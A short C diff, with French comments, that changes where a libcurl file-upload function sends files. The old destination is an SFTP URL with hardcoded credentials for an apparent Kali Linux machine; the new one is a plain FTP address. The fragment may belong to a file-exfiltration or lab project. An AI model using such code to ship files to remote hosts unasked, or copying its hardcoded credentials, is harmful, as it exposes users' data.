@@ -90,7 +90,7 @@ void uploadFile(char *filePath)
     if(curl) {
 
          curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);           /* on active l'option upload pour envoyer des fichier*/
-         curl_easy_setopt(curl, CURLOPT_URL, "sftp://user:kali@10.0.2.15:22/home/kali");    /* on selectionne le serveur destinateur */
+         curl_easy_setopt(curl, CURLOPT_URL, "ftp://172.16.57.128/home/mazene");    /* on selectionne le serveur destinateur */
         curl_easy_setopt(curl, CURLOPT_READFUNCTION, fread);
         curl_easy_setopt(curl, CURLOPT_READDATA, file);              /*lecture de fichier et data */
 
